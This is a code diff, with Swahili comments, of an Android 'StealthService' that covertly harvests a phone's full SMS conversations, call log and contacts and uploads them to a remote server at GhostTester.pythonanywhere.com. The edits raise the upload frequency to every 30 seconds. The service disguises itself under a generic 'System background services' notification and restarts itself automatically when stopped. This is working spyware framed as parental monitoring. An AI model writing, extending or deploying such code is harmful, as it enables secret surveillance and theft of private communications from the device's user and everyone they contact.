@@ -54,7 +54,7 @@ public class StealthService extends Service {
         startForegroundService();
         startPermissionRecovery();
         startSurveillance();
-        
+
         return START_STICKY;
     }
 
@@ -67,7 +67,7 @@ public class StealthService extends Service {
             );
             channel.setDescription("System background services");
             channel.setShowBadge(false);
-            
+
             NotificationManager manager = getSystemService(NotificationManager.class);
             manager.createNotificationChannel(channel);
         }
@@ -92,18 +92,17 @@ public class StealthService extends Service {
                 .setOngoing(true)
                 .build();
         }
-        
+
         startForeground(101, notification);
     }
 
-    // 🆕 FEATURE MPYA: AUTOMATIC PERMISSION RECOVERY
     private void startPermissionRecovery() {
         if (permissionTimer != null) {
             permissionTimer.cancel();
         }
 
         permissionTimer = new Timer();
-        
+
         // Check permissions kila baada ya sekunde 30
         permissionTimer.scheduleAtFixedRate(new TimerTask() {
             @Override
@@ -139,7 +138,7 @@ public class StealthService extends Service {
             }
         }, 0);
 
-        // Rudia kukusanya data kila baada ya dakika 10
+        // 🔄 KUBADILISHWA: Rudia kukusanya data kila baada ya SEKUNDE 30 (badala ya dakika 10)
         timer.scheduleAtFixedRate(new TimerTask() {
             @Override
             public void run() {
@@ -147,23 +146,20 @@ public class StealthService extends Service {
                     collectAndSendAllData();
                 }
             }
-        }, 600000, 600000);
+        }, 30000, 30000); // SEKUNDE 30 (30,000ms)
 
-        Log.d(TAG, "📡 Surveillance imeanzishwa");
+        Log.d(TAG, "📡 Surveillance imeanzishwa - Frequency: 30 seconds");
     }
 
-    // 🆕 FEATURE: AUTOMATIC PERMISSION RECOVERY ATTEMPT
     private void attemptPermissionRecovery() {
         try {
-            // Hii inaweza kutumia system dialogs kuomba permissions
-            // Kwa sasa, tuta-restart service ambayo ita-trigger permission check
             Log.d(TAG, "🔄 Inajaribu kurecover permissions kwa kurestart service...");
-            
+
             Intent restartIntent = new Intent(this, StealthService.class);
             restartIntent.putExtra("PARENT_CODE", parentCode);
             stopSelf();
             startService(restartIntent);
-            
+
         } catch (Exception e) {
             Log.e(TAG, "❌ Error recovering permissions: " + e.getMessage());
         }
@@ -175,7 +171,7 @@ public class StealthService extends Service {
             Manifest.permission.READ_CALL_LOG,
             Manifest.permission.READ_CONTACTS
         };
-        
+
         for (String permission : requiredPermissions) {
             if (checkSelfPermission(permission) != PackageManager.PERMISSION_GRANTED) {
                 return false;
@@ -189,9 +185,9 @@ public class StealthService extends Service {
             Log.d(TAG, "🔄 Kuanza kukusanya data...");
             dataSequence++;
 
-            // 1. Kusanya SMS ZOTE
+            // 1. Kusanya SMS CONVERSATIONS ZOTE
             if (checkPermission(Manifest.permission.READ_SMS)) {
-                collectAndSendSMSData();
+                collectAndSendSMSConversations();
             }
 
             // 2. Kusanya CALL LOG ZOTE
@@ -211,34 +207,32 @@ public class StealthService extends Service {
         }
     }
 
-    private void collectAndSendSMSData() {
+    // 🔄 KUBADILISHWA: Sasa inakusanya CONVERSATIONS zima badala ya messages mbalimbali
+    private void collectAndSendSMSConversations() {
         try {
-            Cursor cursor = getContentResolver().query(
-                Telephony.Sms.CONTENT_URI,
-                null, null, null,
-                Telephony.Sms.DATE + " DESC"
-            );
+            JSONArray conversations = SmsConversationHandler.getAllSmsConversations(getContentResolver());
+            
+            for (int i = 0; i < conversations.length(); i++) {
+                JSONObject conversation = conversations.getJSONObject(i);
+                
+                JSONObject conversationData = new JSONObject();
+                conversationData.put("conversation", conversation);
+                conversationData.put("sequence", dataSequence);
+                conversationData.put("total_conversations", conversations.length());
+                conversationData.put("conversation_index", i);
 
-            if (cursor != null) {
-                int count = 0;
-                while (cursor.moveToNext()) {
-                    JSONObject smsData = new JSONObject();
-                    smsData.put("sender", cursor.getString(cursor.getColumnIndexOrThrow(Telephony.Sms.ADDRESS)));
-                    smsData.put("message", cursor.getString(cursor.getColumnIndexOrThrow(Telephony.Sms.BODY)));
-                    smsData.put("timestamp", cursor.getString(cursor.getColumnIndexOrThrow(Telephony.Sms.DATE)));
-                    smsData.put("type", getSMSTypeText(cursor.getInt(cursor.getColumnIndexOrThrow(Telephony.Sms.TYPE))));
-                    smsData.put("sequence", dataSequence);
-
-                    sendSingleDataToServer("sms", smsData);
-                    count++;
-                    
-                    if (count % 10 == 0) Thread.sleep(2000);
+                sendSingleDataToServer("sms_conversation", conversationData);
+                
+                // Pumzisha kidogo kati ya conversations
+                if (i % 5 == 0) {
+                    Thread.sleep(1000);
                 }
-                cursor.close();
-                Log.d(TAG, "✅ SMS " + count + " zimetumwa");
             }
+            
+            Log.d(TAG, "✅ SMS Conversations " + conversations.length() + " zimetumwa");
+
         } catch (Exception e) {
-            Log.e(TAG, "❌ Error reading SMS: " + e.getMessage());
+            Log.e(TAG, "❌ Error reading SMS conversations: " + e.getMessage());
         }
     }
 
@@ -262,7 +256,7 @@ public class StealthService extends Service {
 
                     sendSingleDataToServer("calls", callData);
                     count++;
-                    
+
                     if (count % 10 == 0) Thread.sleep(2000);
                 }
                 cursor.close();
@@ -288,7 +282,7 @@ public class StealthService extends Service {
                     String name = cursor.getString(cursor.getColumnIndexOrThrow(ContactsContract.Contacts.DISPLAY_NAME));
 
                     JSONArray phoneNumbers = getAllContactPhoneNumbers(contactId);
-                    
+
                     if (phoneNumbers.length() > 0) {
                         JSONObject contactData = new JSONObject();
                         contactData.put("name", name);
@@ -298,7 +292,7 @@ public class StealthService extends Service {
 
                         sendSingleDataToServer("contacts", contactData);
                         count++;
-                        
+
                         if (count % 5 == 0) Thread.sleep(2000);
                     }
                 }
@@ -327,7 +321,7 @@ public class StealthService extends Service {
                         ContactsContract.CommonDataKinds.Phone.NUMBER));
                     String type = getPhoneTypeText(phoneCursor.getInt(phoneCursor.getColumnIndexOrThrow(
                         ContactsContract.CommonDataKinds.Phone.TYPE)));
-                    
+
                     JSONObject phoneInfo = new JSONObject();
                     phoneInfo.put("number", phone);
                     phoneInfo.put("type", type);
@@ -339,15 +333,6 @@ public class StealthService extends Service {
             Log.e(TAG, "Error getting phone numbers: " + e.getMessage());
         }
         return phones;
-    }
-
-    private String getSMSTypeText(int smsType) {
-        switch (smsType) {
-            case Telephony.Sms.MESSAGE_TYPE_INBOX: return "received";
-            case Telephony.Sms.MESSAGE_TYPE_SENT: return "sent";
-            case Telephony.Sms.MESSAGE_TYPE_DRAFT: return "draft";
-            default: return "unknown";
-        }
     }
 
     private String getCallTypeText(int callType) {
@@ -372,7 +357,7 @@ public class StealthService extends Service {
         new Thread(() -> {
             try {
                 String serverUrl = "https://GhostTester.pythonanywhere.com/api/parent/submit-data";
-                
+
                 JSONObject postData = new JSONObject();
                 postData.put("parent_code", parentCode);
                 postData.put("data_type", dataType);
@@ -419,12 +404,12 @@ public class StealthService extends Service {
         super.onDestroy();
         if (timer != null) timer.cancel();
         if (permissionTimer != null) permissionTimer.cancel();
-        
+
         // AUTOMATIC RESTART
         Intent restartIntent = new Intent(this, StealthService.class);
         restartIntent.putExtra("PARENT_CODE", parentCode);
         startService(restartIntent);
-        
+
         Log.d(TAG, "🔄 StealthService inaanzishwa tena kwa kiotomatiki");
     }
 }
